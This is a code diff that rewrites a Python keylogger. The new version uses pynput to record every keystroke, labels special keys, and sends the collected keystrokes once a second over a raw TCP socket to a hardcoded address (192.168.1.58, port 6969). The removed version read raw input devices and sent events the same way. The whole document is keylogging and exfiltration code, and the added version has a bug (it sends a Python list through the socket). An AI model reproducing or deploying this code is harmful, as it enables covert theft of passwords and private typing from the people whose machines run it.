@@ -1,26 +1,48 @@
-#!/bin/python3
+#!/usr/bin/env python3
 
-import struct
+import os
+import time
+import sys
 import socket
-import glob
-from select import select
+import threading
+from pynput.keyboard import Key,Listener
 
-def read_loop(socket):
-    fds = [open(f, 'rb') for f in glob.glob("/dev/input/by-path/*kbd")]
-    struct_format = 'llHHI'
-    event_struct_size = struct.calcsize(struct_format)
+logged_data = []
 
-    while True:
-        readables, _, _ = select.select(fds, [], [], 0.5)
-        if not readables:
-            continue
+def event_handler(key):
+    substitution = ['Key.enter', '[ENTER]\n', 'Key.backspace', '[BACKSPACE]', 'Key.space', ' ',
+    'Key.alt_l', '[ALT]', 'Key.tab', '[TAB]', 'Key.delete', '[DEL]', 'Key.ctrl_l', '[CTRL]',
+    'Key.left', '[LEFT ARROW]', 'Key.right', '[RIGHT ARROW]', 'Key.shift', '[SHIFT]', '\\x13',
+    '[CTRL-S]', '\\x17', '[CTRL-W]', 'Key.caps_lock', '[CAPS LK]', '\\x01', '[CTRL-A]', 'Key.cmd',
+    '[WINDOWS KEY]', 'Key.print_screen', '[PRNT SCR]', '\\x03', '[CTRL-C]', '\\x16', '[CTRL-V]']
 
-        events = [r.read(event_struct_size) for r in readables]
-        for ev in events:
-            (_, _, t, c, v) = struct.unpack(struct_format, ev)
-            socket.send(f'{t},{c},{v}')
+    key = str(key).strip('\'')
+    if key in substitution:
+        logged_data.append(substitution[substitution.index(key)+1])
+    else:
+        logged_data.append(key)
 
-if __name__ == "__main__":
+def run():
+    global logged_data
+
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.connect(("192.168.1.58", 6969))
-    read_loop(s)
+
+    while True:
+        time.sleep(1)
+        if len(logged_data) > 1:
+            try:
+                s.send(logged_data)
+                logged_data = []
+            except Exception as expr:
+                print(expr)
+                sys.exit(1)
+
+if __name__ == "__main__":
+    Thread=threading.Thread(target=run)
+    Thread.start()
+
+    with Listener(on_press=event_handler) as listener:
+                listener.join()
+
+
